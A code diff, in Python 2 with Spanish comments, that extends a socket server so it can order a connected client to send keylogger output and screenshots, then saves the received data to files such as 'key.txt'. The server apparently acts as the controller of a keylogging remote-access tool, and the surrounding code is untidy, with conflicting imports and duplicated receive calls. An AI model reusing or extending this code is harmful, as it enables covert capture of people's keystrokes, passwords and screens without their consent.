@@ -1,10 +1,14 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
 #importamos el modulo socket
-import socket
+# -*- coding: utf-8 -*-
+#import socket
+from socket import socket, error
 import os,socket,sys,ssl
 import threading
 import logging
 import time
+import base64
 
 def conexion(sc,addr):
   while True:
@@ -21,8 +25,49 @@ def conexion(sc,addr):
     print mensaje
     sc.write(mensaje)
     sc.send("\n")
-  
-   
+    if(int(mensaje)==1):
+      print "Esperando keylogger"
+      saveFile("key.txt",sc,addr,0)
+    if(int(mensaje)==2):
+      print "Obteniendo captura...."
+      ahora = time.strftime("%c")
+      input_data = sc.recv(1024)
+      input_data = sc.recv(1024)
+      #saveFile("captura"+ahora+".jpg",sc,addr,1)
+
+
+def saveFile(name,sc,addr,b):
+  f = open(name, "wb")
+  input_data = sc.recv(1024)
+  input_data = sc.recv(1024)
+  while True:
+    try:
+      # Recibir datos del cliente.
+      if(len(input_data)>0):
+        input_data += sc.recv(1024)
+        print input_data
+      else:
+        print "termino de leer"
+        break
+    except error:
+      print("Error de lectura.")
+      break
+  print input_data
+  if b==1:
+    dec=input_data.decode('base64')
+    if isinstance(dec, bytes):
+      end = dec[0] == 1
+    else:
+      end = dec == chr(1)
+    if not end:
+      # Almacenar datos.
+      f.write(dec)
+    #print dec
+    #f.write( dec )
+  else: f.write(input_data)
+  print("El archivo se ha recibido correctamente.")
+  f.close()
+
 #instanciamos un objeto para trabajar con el socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
